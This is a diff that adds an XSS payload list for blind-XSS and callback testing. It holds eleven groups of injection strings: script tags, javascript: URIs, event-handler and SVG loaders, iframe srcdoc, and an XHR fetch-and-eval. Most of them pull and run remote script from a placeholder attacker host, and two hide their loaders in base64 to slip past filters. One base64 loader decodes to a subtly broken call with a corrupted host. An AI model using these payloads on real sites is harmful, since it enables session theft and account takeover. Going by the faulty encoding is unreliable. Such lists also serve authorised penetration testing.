@@ -1,0 +1,45 @@
+# Replace YOURHOST with your OAST/callback domain. Prefer https and your own path.
+
+# 1) Generic <script> tag payloads
+<script>alert(1)</script>
+<script>print()</script>
+<script>new Image().src='https://YOURHOST/p'</script>
+
+# 2) javascript: URI payloads (use for href/src when URL attributes are injectable)
+javascript:alert(1)
+javascript:print()
+javascript:new Image().src='https://YOURHOST/p'
+JaVaScRiPt:alert(1)
+javascript:/*x*/alert(1)
+
+# 3) Input tag with autofocus/onfocus + base64 loader (bypass weak blacklists)
+"><input autofocus onfocus=eval(atob(this.id)) id=ZG9jdW1lbnQudGhlbkNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpLnNyYz0naHR0cHM6Ly9ZT1VSEU9TVC9qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0aGlzKTsg>//
+
+# 4) Image onerror with base64 in attribute (XSShunter-style)
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWU9VUkhPU1QvanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+# 5) jQuery-dependent loaders
+<script>$.getScript('//YOURHOST/js')</script>
+<script>jQuery.getScript('//YOURHOST/js')</script>
+
+# 6) SVG onload/SMIL loaders (when SVG allowed)
+"><svg onload=eval('d=document;_ = d.createElement(\'script\');_.src=\'//YOURHOST/js\';d.body.appendChild(_)') xmlns="http://www.w3.org/2000/svg"></svg>
+"><svg><animate begin="0s" dur="0.001s" onbegin="var d=document,_=d.createElement('script');_.src='//YOURHOST/js';d.body.appendChild(_)"
+
+# 7) Anchor with javascript: URI
+"><a href="javascript:eval('d=document;_=d.createElement(\\'script\\');_.src=\\'//YOURHOST/js\\';d.body.appendChild(_)')">Click</a>
+
+# 8) <iframe srcdoc> auto-exec
+<iframe srcdoc="<script>new Image().src='https://YOURHOST/p'</script>"></iframe>
+<iframe srcdoc="<script src='//YOURHOST/js'></script>"></iframe>
+
+# 9) <video><source> HTML5 error-driven
+<video><source src=1 onerror="var s=document.createElement('script');s.src='//YOURHOST/js';document.body.appendChild(s)"></video>
+
+# 10) XHR fetch for CSP with unsafe-inline but script-src set
+<script>(function(){var x=new XMLHttpRequest();x.open('GET','//YOURHOST/js');x.onload=function(){eval(this.responseText)};x.send()})()</script>
+
+# 11) Minimal OAST beacons for non-visual detection
+<img src=x onerror="new Image().src='https://YOURHOST/p'">
+<svg onload="new Image().src='https://YOURHOST/p'"></svg>
+
